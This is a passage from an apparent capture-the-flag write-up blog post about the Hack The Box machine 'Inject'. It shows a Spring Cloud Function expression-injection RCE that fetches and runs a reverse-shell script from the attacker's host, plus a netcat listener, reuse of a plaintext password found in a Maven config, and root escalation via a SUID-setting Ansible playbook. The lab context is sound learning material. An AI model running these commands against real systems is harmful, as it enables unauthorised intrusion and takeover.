+</span></span><span style="display:flex;"><span>* Connected to 10.10.11.204 <span style="color:#f92672">(</span>10.10.11.204<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; POST /functionRouter HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 10.10.11.204:8080
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.88.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; spring.cloud.function.routing-expression:T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;curl 10.10.14.248:80/reverseshell.sh -o /tmp/rev&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">500</span> 
+</span></span><span style="display:flex;"><span>&lt; Content-Type: application/json
+</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">24</span> Mar <span style="color:#ae81ff">2023</span> 19:33:13 GMT
+</span></span><span style="display:flex;"><span>&lt; Connection: close
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Closing connection <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;2023-03-24T19:33:14.589+00:00&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>:500,<span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Internal Server Error&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;</span>,<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;/functionRouter&#34;</span><span style="color:#f92672">}</span>   
+</span></span></code></pre></div><p>&ndash;&gt; I open the file just upload in the Target Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;bash /tmp/rev&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
+</span></span><span style="display:flex;"><span>Note: Unnecessary use of -X or --request, POST is already inferred.
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.204:8080...
+</span></span><span style="display:flex;"><span>* Connected to 10.10.11.204 <span style="color:#f92672">(</span>10.10.11.204<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; POST /functionRouter HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 10.10.11.204:8080
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.88.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; spring.cloud.function.routing-expression:T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/rev&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>&gt; Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">500</span> 
+</span></span><span style="display:flex;"><span>&lt; Content-Type: application/json
+</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>&lt; Date: Sat, <span style="color:#ae81ff">25</span> Mar <span style="color:#ae81ff">2023</span> 20:33:46 GMT
+</span></span><span style="display:flex;"><span>&lt; Connection: close
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Closing connection <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;2023-03-25T20:33:46.340+00:00&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>:500,<span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Internal Server Error&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;</span>,<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;/functionRouter&#34;</span><span style="color:#f92672">}</span> 
+</span></span></code></pre></div><p>&ndash;&gt; I get a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -nlvp <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.15.7<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.204<span style="color:#f92672">]</span> <span style="color:#ae81ff">54146</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>821<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>frank@inject:/$ 
+</span></span></code></pre></div><p>I find the password to phil account:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>frank@inject:/$  cd /home/frank
+</span></span><span style="display:flex;"><span> cd /home/frank
+</span></span><span style="display:flex;"><span>frank@inject:~$ ls -all
+</span></span><span style="display:flex;"><span>ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> frank frank <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">1</span> 18:38 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">1</span> 18:38 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Jan <span style="color:#ae81ff">24</span> 13:57 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> frank frank <span style="color:#ae81ff">3786</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> frank frank <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">1</span> 18:38 .cache
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> frank frank <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">1</span> 18:38 .local
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> frank frank <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">1</span> 18:38 .m2
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> frank frank  <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
+</span></span><span style="display:flex;"><span>frank@inject:~$ cd .m2
+</span></span><span style="display:flex;"><span>cd .m2
+</span></span><span style="display:flex;"><span>frank@inject:~/.m2$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>settings.xml
+</span></span><span style="display:flex;"><span>frank@inject:~/.m2$ cat settings.xml
+</span></span><span style="display:flex;"><span>cat settings.xml
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;settings xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>        xsi:schemaLocation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;servers&gt;
+</span></span><span style="display:flex;"><span>    &lt;server&gt;
+</span></span><span style="display:flex;"><span>      &lt;id&gt;Inject&lt;/id&gt;
+</span></span><span style="display:flex;"><span>      &lt;username&gt;phil&lt;/username&gt;
+</span></span><span style="display:flex;"><span>      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+</span></span><span style="display:flex;"><span>      &lt;privateKey&gt;<span style="color:#e6db74">${</span>user.home<span style="color:#e6db74">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
+</span></span><span style="display:flex;"><span>      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+</span></span><span style="display:flex;"><span>      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+</span></span><span style="display:flex;"><span>      &lt;configuration&gt;&lt;/configuration&gt;
+</span></span><span style="display:flex;"><span>    &lt;/server&gt;
+</span></span><span style="display:flex;"><span>  &lt;/servers&gt;
+</span></span><span style="display:flex;"><span>&lt;/settings&gt;
+</span></span></code></pre></div><p>&ndash;&gt; Username:Password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>phil:DocPhillovestoInject123
+</span></span></code></pre></div><p>I get the <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>frank@inject:/home$ su phil
+</span></span><span style="display:flex;"><span>su phil
+</span></span><span style="display:flex;"><span>Password: DocPhillovestoInject123
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>phil
+</span></span><span style="display:flex;"><span>python3  -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>phil@inject:/home$ cat /home/phil/user.txt
+</span></span><span style="display:flex;"><span>cat /home/phil/user.txt
+</span></span><span style="display:flex;"><span>49cee70fe684e8615bfc63041e84c28c
+</span></span><span style="display:flex;"><span>phil@inject:/home$ 
+</span></span></code></pre></div><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>With <code>pspy64</code> I see this process:
+&ndash;&gt; If we run it we see that it is eliminating this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>2023/03/25 00:50:11 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">8752</span>   | /usr/bin/rm -rf /opt/automation/tasks/playbook_1.yml 
+</span></span></code></pre></div><p>&ndash;&gt; Delete everything there and then a copy lies in the same path</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>2023/03/25 00:52:11 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">8870</span>   | /bin/sh -c sleep <span style="color:#ae81ff">10</span> <span style="color:#f92672">&amp;&amp;</span> /usr/bin/rm -rf /opt/automation/tasks/* <span style="color:#f92672">&amp;&amp;</span> /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ 
+</span></span></code></pre></div><p>Create this in the <code>opt/automation/tasks</code> path:</p>
+<p>&mdash;&gt; In the Local Machine I create this file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat playbook2.yml 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>yml
+</span></span><span style="display:flex;"><span>- hosts: localhost
+</span></span><span style="display:flex;"><span>  tasks:
+</span></span><span style="display:flex;"><span>    - name: Priv esc
+</span></span><span style="display:flex;"><span>      ansible.builtin.shell: |
+</span></span><span style="display:flex;"><span>        chmod +s /bin/bash
+</span></span><span style="display:flex;"><span>      become: true
+</span></span></code></pre></div><p>&mdash;&gt; I open a web server in my Local Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>&mdash;&gt; With <code>curl</code> in the Target Machine I download the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>phil@inject:/opt/automation/tasks$ curl http://10.10.15.7/pe.yml -o pe.yml
+</span></span><span style="display:flex;"><span>curl http://10.10.15.7/playbook2.yml -o playbook2.yml
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">126</span>  <span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">126</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">586</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--   <span style="color:#ae81ff">600</span>
+</span></span></code></pre></div><p>I remove it but leave the Bash with this permission:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>phil@inject:/tmp$ ls -l /bin/bash
+</span></span><span style="display:flex;"><span>ls -l /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span></code></pre></div><p>I spawn the root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>phil@inject:/tmp$  bash -p
+</span></span><span style="display:flex;"><span> bash -p
+</span></span><span style="display:flex;"><span>bash-5.0# whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I get the <code>root.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>bash-5.0# cat /root/root.txt
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span>69e04a110d58c709e23d9ccb1fd5f95b
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/tokyo_ghoul/">
+                <span class="button__icon">←</span>
+                <span class="button__text">THM Writeup - Tokyo Ghoul (Medium)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/madness/">
+                <span class="button__text">THM Writeup - Madness (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>CyberSpider</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
